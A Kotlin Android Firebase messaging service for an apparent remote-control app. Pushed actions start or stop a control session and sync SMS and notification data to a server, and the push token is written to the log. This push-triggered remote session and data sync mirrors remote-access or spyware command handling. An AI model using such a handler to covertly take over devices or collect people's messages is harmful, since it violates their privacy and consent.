package com.omni.remote.services

import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.omni.remote.data.prefs.PreferencesManager

class OmniFirebaseMessagingService : FirebaseMessagingService() {

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.i(TAG, "New Firebase Messaging token received: $token")
        val prefs = PreferencesManager(this)
        prefs.fcmToken = token
        // Si hay una sesión activa, notificar el nuevo token al servidor.
        ControlSessionManager.getInstance(this).sendFcmToken()
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        Log.i(TAG, "FCM Push received from: ${remoteMessage.from}")

        val data = remoteMessage.data
        if (data.isNotEmpty()) {
            val action = data["action"]
            Log.d(TAG, "FCM data payload action: $action")

            when (action) {
                "START_CONTROL", "START" -> {
                    Log.i(TAG, "Remote wake trigger received via FCM. Activating session...")
                    ControlSessionManager.getInstance(this).startSession("fcm_push")
                }
                "STOP_CONTROL", "STOP" -> {
                    Log.i(TAG, "Remote stop trigger received via FCM. Disconnecting session...")
                    ControlSessionManager.getInstance(this).stopSession("fcm_push")
                }
                "SYNC_NOTIFICATIONS", "SYNC_SMS", "SYNC_PENDING" -> {
                    Log.i(TAG, "Remote sync trigger received via FCM. Opening session to flush pending data...")
                    val session = ControlSessionManager.getInstance(this)
                    session.startSession("fcm_sync")
                    session.sendPendingSync()
                }
                else -> {
                    Log.d(TAG, "Unhandled FCM action: $action")
                }
            }
        }
    }

    companion object {
        private const val TAG = "OmniFCMService"
    }
}
